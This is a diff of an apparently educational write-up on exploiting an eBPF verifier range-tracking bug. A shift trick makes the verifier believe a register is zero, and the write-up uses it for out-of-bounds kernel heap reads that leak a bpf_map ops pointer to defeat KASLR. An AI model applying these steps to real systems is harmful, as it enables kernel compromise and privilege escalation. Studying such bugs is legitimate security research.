@@ -161,7 +161,7 @@ update_map(map_fd, 0, &shift, BPF_ANY); /* map_array[0] = shift */
 Then in our bytecode we will retrieve this value, and using a JMP instruction, we will set the verifier's state to `SHIFT = (0, 1)`
 
 ```c
-BPF_JMP_IMM(BPF_JGE, SHIFT, 2, 19) /* if (SHIFT > 2); pc += 19; 
+BPF_JMP_IMM(BPF_JGE, SHIFT, 2, 19) /* if (SHIFT > 2); pc += 19; */
 ```
 
 Because the branch is not taken (because `SHIFT = 1`), the verifier will now update the range to (0, 1), because those are the unsigned values below 2. Now we just have to execute the left shift with a register that holds 1.
@@ -172,22 +172,53 @@ BPF_MOV64_IMM(VULN, 1),
 BPF_ALU64_REG(BPF_LSH, VULN, SHIFT), // 1 << (0, 1)
 BPF_ALU64_IMM(BPF_SUB, VULN, 1),
 ...
-
 ```
 
 **What the verifier thinks happened**:
-
+```
 I.      VULN = 1
 II.     1 << 0 = 1
 III.    1 - 1 = 0
 
         VULN == 0
+```
 **What happens in runtime**:
 
+```
 I.      VULN = 1
 II.     1 << 1 = 2
 III     1 - 1 = 0
 
         VULN == 1
+```
 
 This is critical, because now we can do **pointer+scalar** MUL operations bypassing every verifier restriction. If we now multiply  `0x1337 * VULN`, the verifier will think the result is 0 and that is safe to add to a pointer, but in reality we will be adding 0x1337 into it.
+
+### Achieving OOB
+
+Now we have the register `VULN`, this register will be the one holding the _confused_ value, if we multiply `VULN` with an arbitrary number we can OOB read infinitely in the target's kernel heap (where the `map_array` is stored). This is the `bpf_map` struct, the target field to get our KASLR leak will be `ops`, this is a pointer in .data with the functions that get executed every time we update, lookup, etc. Every map type has different `ops`.
+```c
+struct bpf_map {
+	const struct bpf_map_ops *ops;
+	struct bpf_map *inner_map_meta;
+#ifdef CONFIG_SECURITY
+	void *security;
+#endif
+	enum bpf_map_type map_type;
+	u32 key_size;
+	u32 value_size;
+	u32 max_entries;
+	u64 map_extra; /* any per-map-type extra fields */
+	u32 map_flags;
+...
+```
+
+Debugging with GDB we found that the start of our array was 0xf8 bytes after the start of the `bpf_map`. We did the following to leak KASLR:
+
+1. Create or `VULN` register
+2. Multiply `VULN * -0xf8`
+3. Add the result to the pointer returned by `bpf_map_lookup` (the start of the array).
+4. Now we have the address of the `ops` member in our return value register.
+5. We use the `bpf_map_update` function to write the leak into our 2nd index in the array.
+
+Now we have a kernel address from userland, and we can calculate KASLR base with this.
